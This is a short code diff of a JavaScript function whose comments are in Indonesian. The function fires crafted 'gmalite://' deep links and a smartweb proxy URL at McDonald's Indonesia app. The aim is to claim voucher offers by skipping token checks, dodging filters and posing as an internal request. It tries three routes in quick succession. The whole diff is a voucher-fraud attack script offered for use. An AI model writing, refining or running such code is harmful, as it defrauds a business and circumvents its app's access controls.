@@ -1,24 +1,25 @@
 function gas() {
-    var o = "272469"; // Contoh McNugget
+    // Pakai ID Ayam + Nasi (272484) karena ini yang paling stabil di server
+    var o = "272484"; 
     var l = "5271";
     
-    // Trik Mukidi: Pakai 'mass-voucher/detail' bukan 'offers/details'
-    // Jalur ini seringkali 'bocor' dan tidak mengecek tanda tangan digital (Token)
-    var payload = "offer_id=" + o + 
-                  "&loyalty_id=" + l + 
-                  "&is_mass_code=1" + 
-                  "&view=claim" + 
-                  "&action=redeem" + 
-                  "&is_native=true";
+    // TEKNIK BARU: Jangan kirim banyak parameter sekaligus (Bisa kena Filter)
+    // Kirim ID intinya saja, biarkan aplikasi yang melengkapi sisanya secara otomatis
+    var target = "gmalite://offers/details?offer_id=" + o + "&loyalty_id=" + l;
 
-    // KUNCINYA: Gunakan pancingan 'mcdonalds.co.id' agar dianggap request internal
-    var internalLink = "https://www.mcdonalds.co.id/mass-voucher/detail?" + payload;
+    // EKSEKUSI TRIPLE HIT (Tembak 3 jalur berbeda dalam 1 klik)
+    
+    // Jalur 1: Standard Deep Link
+    window.location.href = target;
 
-    // Tembak lewat Smartweb (Tanpa partner untuk tes)
-    window.location.href = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(internalLink);
-
-    // Fallback pancingan kedua (Jalur Rewards)
+    // Jalur 2: Jalur Reward (Jika jalur 1 diblokir)
     setTimeout(function() {
-        window.location.href = "gmalite://rewards/details?" + payload;
-    }, 1200);
+        window.location.href = "gmalite://rewards/details?offer_id=" + o + "&loyalty_id=" + l;
+    }, 300);
+
+    // Jalur 3: Jalur Smartweb Proxy (Untuk memaksa respon)
+    setTimeout(function() {
+        var proxy = "https://www.mcdonalds.co.id/promo/details?offer_id=" + o + "&loyalty_id=" + l;
+        window.location.href = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(proxy);
+    }, 600);
 }
